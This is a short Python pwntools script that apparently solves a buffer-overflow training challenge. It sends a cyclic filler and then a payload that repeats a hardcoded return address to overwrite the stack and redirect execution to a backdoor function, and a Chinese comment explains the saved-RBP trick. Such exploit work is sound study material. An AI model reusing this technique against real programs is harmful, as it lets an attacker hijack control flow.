#!/usr/bin/python

import pwn

def readlines(proc):
    try:
        lines = proc.recvlines(timeout=0.01)
        for line in lines:
            print(line.decode())
    except:
        pass
def send_payload(proc, payload):
    proc.send_raw(payload)
    print(payload)
    readlines(proc)

ret_addr = 0x401300
proc = pwn.process("/challenge/buffer-overflow-level4.0")

payload = pwn.cyclic(0x20)  # name
send_payload(proc, payload)

payload = pwn.p64(ret_addr) * 0x21    # 将栈中所有内容修改为后门地址，save_rbp减小到栈内，造成上一级调用函数的返回地址为缓冲区内内容
send_payload(proc, payload)

print(proc.recv())